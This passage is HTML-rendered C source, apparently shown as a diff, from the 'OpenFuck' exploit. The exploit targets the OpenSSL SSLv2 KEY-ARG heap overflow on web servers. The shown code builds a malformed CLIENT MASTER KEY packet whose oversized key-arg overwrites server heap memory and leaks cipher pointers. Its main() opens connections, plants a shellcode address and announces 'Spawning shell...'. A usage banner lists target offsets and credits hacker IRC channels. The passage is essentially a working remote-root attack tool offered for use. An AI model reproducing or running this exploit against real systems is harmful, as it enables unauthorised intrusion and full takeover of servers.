+                <span style="color:#0088ff;font-weight:400">/*&nbsp;The&nbsp;connection&nbsp;id&nbsp;is&nbsp;sent&nbsp;back&nbsp;to&nbsp;the&nbsp;server&nbsp;in&nbsp;the&nbsp;CLIENT&nbsp;FINISHED&nbsp;packet&nbsp;*/</span><br>
+                ssl-&gt;conn_id_length&nbsp;=&nbsp;conn_id_length;<br>
+                memcpy(ssl-&gt;conn_id,&nbsp;p,&nbsp;conn_id_length);<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Send&nbsp;a&nbsp;CLIENT&nbsp;MASTER&nbsp;KEY&nbsp;message&nbsp;to&nbsp;the&nbsp;server&nbsp;*/</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;send_client_master_key(ssl_conn*&nbsp;ssl,&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;key_arg_overwrite,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;key_arg_overwrite_len)&nbsp;{<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;encrypted_key_length,&nbsp;key_arg_length,&nbsp;record_length;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;p;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                EVP_PKEY&nbsp;*pkey=<span style="color:#0088ff;font-weight:700">NULL</span>;<br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE]&nbsp;=<br>
+                <span style="color:#3ad900;font-weight:400">"\x02"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;client&nbsp;master&nbsp;key&nbsp;message&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x01\x00\x80"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;cipher&nbsp;kind&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;clear&nbsp;key&nbsp;length&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x40"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;encrypted&nbsp;key&nbsp;length&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x08"</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;key&nbsp;arg&nbsp;length&nbsp;*/</span><br>
+                <br>
+                p&nbsp;=&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">10</span>];<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;generate&nbsp;a&nbsp;128&nbsp;byte&nbsp;master&nbsp;key&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&nbsp;&lt;&nbsp;RC4_KEY_LENGTH;&nbsp;i++)&nbsp;{<br>
+                ssl-&gt;master_key[i]&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;(rand()&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span>);<br>
+                }<br>
+                <br>
+                pkey=X509_get_pubkey(ssl-&gt;x509);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!pkey)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"send&nbsp;client&nbsp;master&nbsp;key:&nbsp;No&nbsp;public&nbsp;key&nbsp;in&nbsp;the&nbsp;server&nbsp;certificate\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(EVP_PKEY_get1_RSA(pkey)&nbsp;==&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"send&nbsp;client&nbsp;master&nbsp;key:&nbsp;The&nbsp;public&nbsp;key&nbsp;in&nbsp;the&nbsp;server&nbsp;certificate&nbsp;is&nbsp;not&nbsp;a&nbsp;RSA&nbsp;key\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Encrypt&nbsp;the&nbsp;client&nbsp;master&nbsp;key&nbsp;with&nbsp;the&nbsp;server&nbsp;public&nbsp;key&nbsp;and&nbsp;put&nbsp;it&nbsp;in&nbsp;the&nbsp;packet&nbsp;*/</span><br>
+                encrypted_key_length&nbsp;=&nbsp;RSA_public_encrypt(RC4_KEY_LENGTH,&nbsp;ssl-&gt;master_key,&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">10</span>],&nbsp;EVP_PKEY_get1_RSA(pkey),&nbsp;RSA_PKCS1_PADDING);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(encrypted_key_length&nbsp;&lt;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"send&nbsp;client&nbsp;master&nbsp;key:&nbsp;RSA&nbsp;encryption&nbsp;failure\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                p&nbsp;+=&nbsp;encrypted_key_length;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(key_arg_overwrite)&nbsp;{<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;These&nbsp;8&nbsp;bytes&nbsp;fill&nbsp;the&nbsp;key&nbsp;arg&nbsp;array&nbsp;on&nbsp;the&nbsp;server&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span>;&nbsp;i++)&nbsp;{<br>
+                *(p++)&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;(rand()&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span>);<br>
+                }<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;This&nbsp;overwrites&nbsp;the&nbsp;data&nbsp;following&nbsp;the&nbsp;key&nbsp;arg&nbsp;array&nbsp;*/</span><br>
+                memcpy(p,&nbsp;key_arg_overwrite,&nbsp;key_arg_overwrite_len);<br>
+                <br>
+                key_arg_length&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">8</span>&nbsp;+&nbsp;key_arg_overwrite_len;<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                key_arg_length&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;RC4&nbsp;doesn't&nbsp;use&nbsp;KEY-ARG&nbsp;*/</span><br>
+                }<br>
+                p&nbsp;=&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">6</span>];<br>
+                s2n(encrypted_key_length,&nbsp;p);<br>
+                s2n(key_arg_length,&nbsp;p);<br>
+                record_length&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">10</span>&nbsp;+&nbsp;encrypted_key_length&nbsp;+&nbsp;key_arg_length;<br>
+                send_ssl_packet(ssl,&nbsp;buf,&nbsp;record_length);<br>
+                ssl-&gt;encrypted&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;generate_key_material(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                MD5_CTX&nbsp;ctx;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*km;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;c=<span style="color:#00117f;font-weight:400">'0'</span>;<br>
+                <br>
+                km=ssl-&gt;key_material;<br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i=<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&lt;RC4_KEY_MATERIAL_LENGTH;&nbsp;i+=MD5_DIGEST_LENGTH)&nbsp;{<br>
+                MD5_Init(&amp;ctx);<br>
+                <br>
+                MD5_Update(&amp;ctx,ssl-&gt;master_key,RC4_KEY_LENGTH);<br>
+                MD5_Update(&amp;ctx,&amp;c,<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                c++;<br>
+                MD5_Update(&amp;ctx,ssl-&gt;challenge,CHALLENGE_LENGTH);<br>
+                MD5_Update(&amp;ctx,ssl-&gt;conn_id,&nbsp;ssl-&gt;conn_id_length);<br>
+                MD5_Final(km,&amp;ctx);<br>
+                km+=MD5_DIGEST_LENGTH;<br>
+                }<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;generate_session_keys(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                generate_key_material(ssl);<br>
+                ssl-&gt;read_key&nbsp;=&nbsp;&amp;(ssl-&gt;key_material[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                ssl-&gt;rc4_read_key&nbsp;=&nbsp;(RC4_KEY*)&nbsp;malloc(<span style="color:#ff9d00;font-weight:700">sizeof</span>(RC4_KEY));<br>
+                RC4_set_key(ssl-&gt;rc4_read_key,&nbsp;RC4_KEY_LENGTH,&nbsp;ssl-&gt;read_key);<br>
+                <br>
+                ssl-&gt;write_key&nbsp;=&nbsp;&amp;(ssl-&gt;key_material[RC4_KEY_LENGTH]);<br>
+                ssl-&gt;rc4_write_key&nbsp;=&nbsp;(RC4_KEY*)&nbsp;malloc(<span style="color:#ff9d00;font-weight:700">sizeof</span>(RC4_KEY));<br>
+                RC4_set_key(ssl-&gt;rc4_write_key,&nbsp;RC4_KEY_LENGTH,&nbsp;ssl-&gt;write_key);<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;get_server_verify(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;len;<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!(len&nbsp;=&nbsp;read_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(buf))))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Server&nbsp;error:&nbsp;%s\n"</span>,&nbsp;ssl_error(ntohs(*(uint16_t*)&amp;buf[<span style="color:#ff0044;font-weight:400">1</span>])));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(len&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;+&nbsp;CHALLENGE_LENGTH)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;verify:&nbsp;Malformed&nbsp;packet&nbsp;size\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;!=&nbsp;SSL2_MT_SERVER_VERIFY)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;verify:&nbsp;Expected&nbsp;SSL2&nbsp;MT&nbsp;SERVER&nbsp;VERIFY,&nbsp;got&nbsp;%x\n"</span>,&nbsp;(<span style="color:#7f0044;font-weight:400">int</span>)buf[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(memcmp(ssl-&gt;challenge,&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;CHALLENGE_LENGTH))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;verify:&nbsp;Challenge&nbsp;strings&nbsp;don't&nbsp;match\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;send_client_finished(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;SSL2_MT_CLIENT_FINISHED;<br>
+                memcpy(&amp;buf[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;ssl-&gt;conn_id,&nbsp;ssl-&gt;conn_id_length);<br>
+                send_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>+ssl-&gt;conn_id_length);<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;get_server_finished(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;len;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!(len&nbsp;=&nbsp;read_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(buf))))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Server&nbsp;error:&nbsp;%s\n"</span>,&nbsp;ssl_error(ntohs(*(uint16_t*)&amp;buf[<span style="color:#ff0044;font-weight:400">1</span>])));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;!=&nbsp;SSL2_MT_SERVER_FINISHED)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;finished:&nbsp;Expected&nbsp;SSL2&nbsp;MT&nbsp;SERVER&nbsp;FINISHED,&nbsp;got&nbsp;%x\n"</span>,&nbsp;(<span style="color:#7f0044;font-weight:400">int</span>)buf[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(len&nbsp;&lt;=&nbsp;<span style="color:#ff0044;font-weight:400">112</span>&nbsp;<span style="color:#0088ff;font-weight:400">/*17*/</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"This&nbsp;server&nbsp;is&nbsp;not&nbsp;vulnerable&nbsp;to&nbsp;this&nbsp;attack.\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                cipher&nbsp;=&nbsp;*(<span style="color:#7f0044;font-weight:400">int</span>*)&amp;buf[<span style="color:#ff0044;font-weight:400">101</span>];<br>
+                ciphers&nbsp;=&nbsp;*(<span style="color:#7f0044;font-weight:400">int</span>*)&amp;buf[<span style="color:#ff0044;font-weight:400">109</span>];<br>
+                printf(<span style="color:#3ad900;font-weight:400">"cipher:&nbsp;0x%x&nbsp;&nbsp;&nbsp;ciphers:&nbsp;0x%x\n"</span>,&nbsp;cipher,&nbsp;ciphers);<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;get_server_error(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;len;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((len&nbsp;=&nbsp;read_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(buf)))&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;finished:&nbsp;Expected&nbsp;SSL2&nbsp;MT&nbsp;ERROR,&nbsp;got&nbsp;%x\n"</span>,&nbsp;(<span style="color:#7f0044;font-weight:400">int</span>)buf[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;usage(<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;argv0)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                printf(<span style="color:#3ad900;font-weight:400">":&nbsp;Usage:&nbsp;%s&nbsp;target&nbsp;box&nbsp;[port]&nbsp;[-c&nbsp;N]\n\n"</span>,&nbsp;argv0);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;target&nbsp;-&nbsp;supported&nbsp;box&nbsp;eg:&nbsp;0x00\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;box&nbsp;-&nbsp;hostname&nbsp;or&nbsp;IP&nbsp;address\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;port&nbsp;-&nbsp;port&nbsp;for&nbsp;ssl&nbsp;connection\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-c&nbsp;open&nbsp;N&nbsp;connections.&nbsp;(use&nbsp;range&nbsp;40-50&nbsp;if&nbsp;u&nbsp;dont&nbsp;know)\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;\n\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;Supported&nbsp;OffSet:\n"</span>);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i=<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&lt;=MAX_ARCH;&nbsp;i++)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"\t0x%02x&nbsp;-&nbsp;%s\n"</span>,&nbsp;i,&nbsp;architectures[i].desc);<br>
+                }<br>
+                printf(<span style="color:#3ad900;font-weight:400">"\nFuck&nbsp;to&nbsp;all&nbsp;guys&nbsp;who&nbsp;like&nbsp;use&nbsp;lamah&nbsp;ddos.&nbsp;Read&nbsp;SRC&nbsp;to&nbsp;have&nbsp;no&nbsp;surprise\n"</span>);<br>
+                <br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;main(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;argc,&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;argv[])<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">char</span>*&nbsp;host;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;port&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">443</span>;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;arch;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;N&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                ssl_conn*&nbsp;ssl1;<br>
+                ssl_conn*&nbsp;ssl2;<br>
+                <br>
+                printf(<span style="color:#3ad900;font-weight:400">"\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*******************************************************************\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;OpenFuck&nbsp;v3.0.32-root&nbsp;priv8&nbsp;by&nbsp;SPABAM&nbsp;based&nbsp;on&nbsp;openssl-too-open&nbsp;*\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*******************************************************************\n"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;by&nbsp;SPABAM&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;code&nbsp;of&nbsp;Spabam&nbsp;-&nbsp;LSD-pl&nbsp;-&nbsp;SolarEclipse&nbsp;-&nbsp;CORE&nbsp;*\n"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;#hackarena&nbsp;&nbsp;irc.brasnet.org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;TNX&nbsp;Xanthic&nbsp;USG&nbsp;#SilverLords&nbsp;#BloodBR&nbsp;#isotk&nbsp;#highsecure&nbsp;#uname&nbsp;*\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;#ION&nbsp;#delirium&nbsp;#nitr0x&nbsp;#coder&nbsp;#root&nbsp;#endiabrad0s&nbsp;#NHC&nbsp;#TechTeam&nbsp;*\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*&nbsp;#pinchadoresweb&nbsp;HiTechHate&nbsp;DigitalWrapperz&nbsp;P()W&nbsp;GAT&nbsp;ButtP!rateZ&nbsp;*\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"*******************************************************************\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"\n"</span>);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((argc&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>)&nbsp;||&nbsp;(argc&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">6</span>))<br>
+                usage(argv[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                sscanf(argv[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"0x%x"</span>,&nbsp;&amp;arch);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((arch&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;||&nbsp;(arch&nbsp;&gt;&nbsp;MAX_ARCH))<br>
+                usage(argv[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                host&nbsp;=&nbsp;argv[<span style="color:#ff0044;font-weight:400">2</span>];<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(argc&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">4</span>)<br>
+                port&nbsp;=&nbsp;atoi(argv[<span style="color:#ff0044;font-weight:400">3</span>]);<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(argc&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">5</span>)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcmp(argv[<span style="color:#ff0044;font-weight:400">3</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"-c"</span>))<br>
+                usage(argv[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                N&nbsp;=&nbsp;atoi(argv[<span style="color:#ff0044;font-weight:400">4</span>]);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(argc&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">6</span>)&nbsp;{<br>
+                port&nbsp;=&nbsp;atoi(argv[<span style="color:#ff0044;font-weight:400">3</span>]);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcmp(argv[<span style="color:#ff0044;font-weight:400">4</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"-c"</span>))<br>
+                usage(argv[<span style="color:#ff0044;font-weight:400">0</span>]);<br>
+                N&nbsp;=&nbsp;atoi(argv[<span style="color:#ff0044;font-weight:400">5</span>]);<br>
+                }<br>
+                srand(<span style="color:#ff0044;font-weight:400">0x31337</span>);<br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i=<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&lt;N;&nbsp;i++)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"\rConnection...&nbsp;%d&nbsp;of&nbsp;%d"</span>,&nbsp;i+<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;N);<br>
+                fflush(stdout);<br>
+                connect_host(host,&nbsp;port);<br>
+                usleep(<span style="color:#ff0044;font-weight:400">100000</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(N)&nbsp;printf(<span style="color:#3ad900;font-weight:400">"\n"</span>);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Establishing&nbsp;SSL&nbsp;connection\n"</span>);<br>
+                ssl1&nbsp;=&nbsp;ssl_connect_host(host,&nbsp;port);<br>
+                ssl2&nbsp;=&nbsp;ssl_connect_host(host,&nbsp;port);<br>
+                send_client_hello(ssl1);<br>
+                get_server_hello(ssl1);<br>
+                send_client_master_key(ssl1,&nbsp;overwrite_session_id_length,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(overwrite_session_id_length)-<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                generate_session_keys(ssl1);<br>
+                get_server_verify(ssl1);<br>
+                send_client_finished(ssl1);<br>
+                get_server_finished(ssl1);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Ready&nbsp;to&nbsp;send&nbsp;shellcode\n"</span>);<br>
+                port&nbsp;=&nbsp;get_local_port(ssl2-&gt;sock);<br>
+                overwrite_next_chunk[FINDSCKPORTOFS]&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;(port&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xff</span>);<br>
+                overwrite_next_chunk[FINDSCKPORTOFS+<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;((port&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span>)&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xff</span>);<br>
+                *(<span style="color:#7f0044;font-weight:400">int</span>*)&amp;overwrite_next_chunk[<span style="color:#ff0044;font-weight:400">156</span>]&nbsp;=&nbsp;cipher;<br>
+                *(<span style="color:#7f0044;font-weight:400">int</span>*)&amp;overwrite_next_chunk[<span style="color:#ff0044;font-weight:400">192</span>]&nbsp;=&nbsp;architectures[arch].func_addr&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">12</span>;<br>
+                *(<span style="color:#7f0044;font-weight:400">int</span>*)&amp;overwrite_next_chunk[<span style="color:#ff0044;font-weight:400">196</span>]&nbsp;=&nbsp;ciphers&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">16</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;shellcode&nbsp;address&nbsp;*/</span><br>
+                send_client_hello(ssl2);<br>
+                get_server_hello(ssl2);<br>
+                send_client_master_key(ssl2,&nbsp;overwrite_next_chunk,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(overwrite_next_chunk)-<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                generate_session_keys(ssl2);<br>
+                get_server_verify(ssl2);<br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&nbsp;&lt;&nbsp;ssl2-&gt;conn_id_length;&nbsp;i++)&nbsp;{<br>
+                ssl2-&gt;conn_id[i]&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;(rand()&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span>);<br>
+                }<br>
+                send_client_finished(ssl2);<br>
+                get_server_error(ssl2);<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Spawning&nbsp;shell...\n"</span>);<br>
